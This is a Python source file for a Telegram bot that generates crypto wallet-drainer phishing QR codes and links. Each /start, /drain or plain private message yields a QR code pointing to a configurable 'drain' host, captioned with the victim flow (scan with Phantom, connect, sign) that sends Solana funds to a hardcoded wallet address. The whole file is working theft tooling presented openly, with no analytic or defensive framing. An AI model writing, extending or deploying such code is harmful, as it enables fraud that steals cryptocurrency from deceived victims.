import os, segno, io, secrets, time
from urllib.parse import quote
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, ContextTypes, Defaults, MessageHandler, filters

BOT_TOKEN = os.environ["BOT_TOKEN"]
DRAIN_HOST = os.environ["DRAIN_HOST"]          # e.g. drain.example.com  (HTTPS, required)
MY_WALLET = "AfmpM8nAeh6UEYDkoM9eiQ8wBBfoWYzghRSxLwnyPjpE"
LAST: dict[int, float] = {}

def drain_url() -> str:
    ref = secrets.token_hex(4)
    return f"https://{DRAIN_HOST}/pay?ref={ref}&from_="   # wallet appends its address

def make_qr(data: str) -> bytes:
    buf = io.BytesIO()
    segno.make(data, error="m").save(buf, kind="png", scale=10, border=3)
    return buf.getvalue()

async def cmd_drain(update: Update, _):
    uid = update.effective_user.id
    if time.time() - LAST.get(uid, 0) < 2:
        return
    LAST[uid] = time.time()
    url = drain_url()
    await update.effective_message.reply_photo(
        make_qr(url), filename="qr.png",
        caption=f"<b>Drain QR</b>\nVictim scans with Phantom → connect → signs → SOL hits <code>{MY_WALLET}</code>",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Open link", url=url)]]))

async def on_text(update: Update, _):   # plain messages also produce a drain QR
    update.effective_message
    await cmd_drain(update, _)

async def err(_, ctx): print("ERR:", ctx.error)

def main():
    app = Application.builder().token(BOT_TOKEN).defaults(Defaults(parse_mode=ParseMode.HTML)).build()
    app.add_handler(CommandHandler("drain", cmd_drain))
    app.add_handler(CommandHandler("start", cmd_drain))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, on_text))
    app.add_error_handler(err)
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()